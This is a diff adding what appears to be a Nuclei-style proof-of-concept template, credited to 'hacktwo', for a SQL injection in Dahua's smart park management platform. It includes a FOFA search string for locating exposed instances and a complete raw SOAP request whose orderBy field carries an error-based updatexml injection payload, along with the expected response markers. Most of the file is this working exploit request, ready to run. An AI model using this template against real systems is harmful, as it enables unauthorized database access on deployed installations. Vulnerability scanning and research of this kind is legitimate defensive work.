@@ -1,0 +1,87 @@
+id: poc-vaf3a2cg4602zpfs
+info:
+  name: 大华智慧园区综合管理平台getNewStaypointDetailQuery SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vaf3a2cg4602zpfs'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vaf3a2cg4602zpfs
+    fofa: app="dahua-智慧园区综合管理平台"
+http:
+- raw:
+  - 'POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: text/xml;charset=UTF-8
+
+
+
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
+
+
+    <soapenv:Header/>
+
+
+    <soapenv:Body>
+
+
+    <car:getNewStaypointDetailQuery>
+
+
+    <!--type: string-->
+
+
+    <searchJson>{}</searchJson>
+
+
+    <!--type: string-->
+
+
+    <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select md5(1)),0x7e),1)--"}</pageJson>
+
+
+    <!--type: string-->
+
+
+    <extend>quae divum incedo</extend>
+
+
+    </car:getNewStaypointDetailQuery>
+
+
+    </soapenv:Body>
+
+
+    </soapenv:Envelope>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    a0b923820dcc509a
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
